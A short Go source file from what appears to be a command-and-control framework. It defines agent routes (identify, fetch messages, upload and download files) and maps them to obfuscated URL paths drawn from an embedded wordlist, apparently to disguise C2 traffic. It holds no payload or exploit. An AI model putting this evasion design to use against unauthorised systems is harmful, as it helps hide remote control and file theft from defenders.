package c2api

import (
	_ "embed"
	"strings"
)

//go:embed routes.txt
var RawRoutesDoc string

const (
	R_AGENT_IDENTIFY      = 0
	R_MESSAGE_RESPOND     = 1
	R_FETCH_MESSAGES      = 2
	R_FETCH_MESSAGES_LIVE = 3
	R_FILE_LIST           = 4
	R_FILE_UPLOAD         = 5
	R_FILE_DOWNLOAD       = 6
)

var RouteMap map[int][]string = func() (rMap map[int][]string) {
	registeredObfuscatedRoutes := []int{
		R_AGENT_IDENTIFY, R_FETCH_MESSAGES, R_MESSAGE_RESPOND,
		R_FETCH_MESSAGES_LIVE, R_FILE_LIST, R_FILE_UPLOAD,
		R_FILE_DOWNLOAD,
	}

	rMap = make(map[int][]string, len(registeredObfuscatedRoutes))

	wlChunks := chunkSlice(strings.Split(RawRoutesDoc, "\n"), len(registeredObfuscatedRoutes))

	for chunkIndex, chunk := range wlChunks {
		rMap[registeredObfuscatedRoutes[chunkIndex]] = chunk
	}

	return rMap
}()
